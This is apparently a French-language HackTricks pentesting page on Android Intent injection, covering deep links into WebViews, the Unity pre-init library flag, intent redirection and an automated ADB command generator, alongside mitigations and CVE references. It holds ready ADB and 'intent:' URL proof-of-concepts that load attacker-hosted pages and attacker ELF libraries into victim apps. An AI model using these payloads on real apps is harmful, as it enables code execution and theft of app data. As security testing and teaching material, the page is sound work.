# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection abuse des composants qui acceptent des Intents contrôlés par l'attaquant ou des données qui sont ensuite converties en Intents. Deux schémas très courants lors de pentests d'applications Android sont :

- Passing crafted extras to exported Activities/Services/BroadcastReceivers qui sont ensuite forwardés vers des composants privilégiés, non-exported.
- Triggering exported VIEW/BROWSABLE deep links qui forwardent des URLs contrôlées par l'attaquant vers des WebViews internes ou d'autres sinks sensibles.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
et si l'Activity destinataire transmet le paramètre de requête `url` à un WebView, vous pouvez forcer l'application à afficher du contenu distant arbitraire dans son propre contexte WebView.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS s'exécute à l'intérieur du profil WebView de l'app.
- Si JavaScript est activé (par défaut ou à cause de contrôles mal ordonnés), vous pouvez énumérer/utiliser tous les objets exposés `@JavascriptInterface`, voler les cookies/le stockage local du WebView, et pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Bug d'ordre des vérifications permettant d'activer JavaScript

Un bug récurrent consiste à activer JavaScript (ou d'autres paramètres permissifs du WebView) avant que la allowlist/vérification finale de l'URL ne soit terminée. Si des helpers précoces acceptent votre deep link et que le WebView est configuré en premier, votre chargement final se produit avec JavaScript déjà activé même si les vérifications ultérieures sont défaillantes ou trop tardives.

What to look for in decompiled code:
- Multiple helpers that parse/split/rebuild the URL differently (inconsistent normalization).
- Calls to `getSettings().setJavaScriptEnabled(true)` before the last host/path allowlist check.
- A pipeline like: parse → partial validate → configure WebView → final verify → loadUrl.

Contre-mesures
- Canonicaliser une fois et valider strictement ; échouer en mode fermé.
- N'activer JavaScript qu'après le passage de toutes les vérifications et juste avant de charger du contenu de confiance.
- Éviter d'exposer des bridges à des origines non fiables.

## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Les applications Android basées sur Unity utilisent typiquement `com.unity3d.player.UnityPlayerActivity` (ou `UnityPlayerGameActivity`) comme Activity d'entrée. Le template Android de Unity traite un Intent extra spécial nommé `unity` comme une chaîne de flags en ligne de commande pour le runtime Unity. Lorsque l'Activity d'entrée est exported (par défaut dans de nombreux templates), toute application locale — et parfois un site web si `BROWSABLE` est présent — peut fournir cet extra.

Un flag dangereux et non documenté permet l'exécution de code natif très tôt lors de l'initialisation du processus :

- Flag caché : `-xrsdk-pre-init-library <absolute-path>`
- Effet : `dlopen(<absolute-path>, RTLD_NOW)` très tôt dans l'init, chargeant un ELF contrôlé par l'attaquant à l'intérieur du processus de l'app cible avec son UID et ses permissions.

Extrait de rétro-ingénierie (simplifié):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Pourquoi cela fonctionne
- L'Intent extra `unity` est parsé en Unity runtime flags.
- La fourniture du pre-init flag pointe Unity vers un attacker-controlled ELF path à l'intérieur d'un allowed linker namespace path (voir les contraintes ci-dessous).

Conditions d'exploitation
- L'Activity d'entrée Unity est exportée (généralement true par défaut).
- Pour un accès à distance en un clic via le navigateur : l'entry Activity déclare aussi `android.intent.category.BROWSABLE` afin que les extras puissent être transmis depuis une URL `intent:`.

Exploitation locale (même appareil)
1) Placez un payload ELF dans un chemin lisible par la victim app. Le plus simple : embarquez une bibliothèque malveillante dans votre propre attacker app et assurez-vous qu'elle soit extraite sous `/data/app/.../lib/<abi>/` en définissant dans le attacker’s manifest:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Lancez l'Activity Unity de la victime avec le flag pre-init de la CLI dans l'extra `unity`. Exemple ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; votre payload s'exécute dans le processus victime, héritant de toutes ses permissions d'application (caméra/mic/réseau/stockage, etc.) et de l'accès aux sessions/données de l'application.

Notes
- Le chemin exact `/data/app/...` varie selon les appareils/installations. Une app attaquante peut récupérer son propre répertoire de libs natifs à l'exécution via `getApplicationInfo().nativeLibraryDir` et le communiquer au trigger.
- Le fichier n'a pas besoin de se terminer par `.so` s'il s'agit d'un ELF valide — `dlopen()` regarde les en-têtes ELF, pas les extensions.

Remote one‑click via browser (conditional)
Si l'activity d'entrée Unity est exportée avec `BROWSABLE`, un site web peut transmettre des extras via une URL `intent:` :
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Cependant, sur les versions modernes d'Android, les espaces de noms du linker dynamique et SELinux empêchent le chargement depuis de nombreux chemins publics (par ex., `/sdcard/Download`). Vous verrez des erreurs comme :
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: target apps that cache attacker-controlled bytes under their private storage (e.g., HTTP caches). Because permitted paths include `/data` and the app’s private dir, pointing `-xrsdk-pre-init-library` at an absolute path inside the app’s cache can satisfy linker constraints and yield code execution. This mirrors prior cache-to-ELF RCE patterns experienced in other Android apps.

## Autres primitives classiques d'Intent injection

- startActivity/sendBroadcast utilisant des extras `Intent` fournis par l'attaquant qui sont ensuite re-parsés (`Intent.parseUri(...)`) et exécutés.
- Composants proxy exportés qui transfèrent des Intents vers des composants sensibles non-exportés sans vérification de permission.

---

## Automatisation des tests de composants exportés (Smali-driven ADB generation)

Quand des composants exportés attendent des extras spécifiques, deviner la forme du payload entraîne une perte de temps et des faux négatifs. Vous pouvez automatiser la découverte des clés/types directement depuis Smali et générer des commandes adb prêtes à l'emploi.

Outil: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approche: décompiler et scanner Smali pour des appels comme `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` afin d'inférer quels extras et champs sont consommés par chaque composant.
- Sortie: pour chaque Activity/Service/Receiver/Provider exporté(e), l'outil affiche une brève explication et la commande exacte `adb shell am ...`/`cmd content ...` avec les flags correctement typés.

Installer
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Utilisation
```bash
python apk-components-inspector.py target.apk
```
Exemple de sortie
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras — aide-mémoire (indicateurs sensibles au type)
- Chaînes : `--es key value` | Tableau de chaînes : `--esa key v1,v2`
- Entiers : `--ei key 123` | Tableau d'entiers : `--eia key 1,2,3`
- Booléens : `--ez key true|false`
- Longs : `--el key 1234567890`
- Nombres à virgule flottante : `--ef key 1.23`
- URI (extra) : `--eu key content://...` | Data URI (Intent data) : `-d content://...`
- Extra de composant : `--ecn key com.pkg/.Cls`
- Extra chaîne nulle : `--esn key`
- Flags courants : `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Conseils pro pour les ContentProviders
- Utilisez `adb shell cmd content query|insert|update|delete ...` pour atteindre les ContentProviders sans agents.
- Pour le probing SQLi, variez `--projection` et `--where` (aka selection) lorsque le provider sous-jacent est basé sur SQLite.

Automatisation de pipeline complet (exécuteur interactif)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Script d'aide (fusionne les lignes interrompues, n'exécute que les lignes commençant par `adb`) :
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
Exécuter sur l'appareil : l'inspecteur est basé sur Python et fonctionne dans Termux ou sur des téléphones rootés où `apktool`/`androguard` sont disponibles.

---

## Intent Redirection (CWE-926) – découverte et exploitation

Schéma
- Un point d'entrée exporté (Activity/Service/Receiver) lit un Intent entrant et le transfère en interne ou en externe sans valider la source/les données, par ex. :
- `startActivity(getIntent())`
- `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
- Se fier aux champs `action`/`data`/`component` sans vérifications ; ne pas vérifier l'identité de l'appelant.

Ce qu'il faut rechercher dans Smali/Java
- Utilisations de `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Appels directs à `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` sur des Intents influencés par un attaquant.
- Absence de contrôles `getCallingPackage()`/`getCallingActivity()` ou de restrictions par permission personnalisée.

ADB PoC templates
- Proxy Activity transférant un Intent supplémentaire vers une Activity interne privilégiée:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Service exporté qui prend en charge un parcelable `redirect_intent` :
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Receiver exporté qui relaie sans validation :
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags utiles pour le comportement de type singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Exemples réels (impact variable) :
- CVE-2024-26131 (Element Android) : des flux exportés menant à la manipulation de WebView, contournement de PIN, détournement de session/login.
- CVE-2023-44121 (LG ThinQ Service) : exported receiver action `com.lge.lms.things.notification.ACTION` → effets au niveau système.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00) : redirection → accès arbitraire à des fichiers (avec interaction utilisateur).
- CVE-2022-36837 (Samsung Email < 6.1.70.20) : implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Mesures d'atténuation (liste de vérification pour développeurs)
- Ne pas forwarder les Intents entrants directement ; assainir (sanitize) et reconstruire les champs autorisés.
- Restreindre l'exposition avec `android:exported="false"` sauf si nécessaire. Protéger les composants exportés avec des permissions et des signatures.
- Vérifier l'identité de l'appelant (`getCallingPackage()`/`getCallingActivity()`), et imposer des Intents explicites pour la navigation intra-app.
- Valider à la fois `action` et `data` (scheme/host/path) avant utilisation ; éviter `Intent.parseUri` sur des entrées non fiables.

---

## Références

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
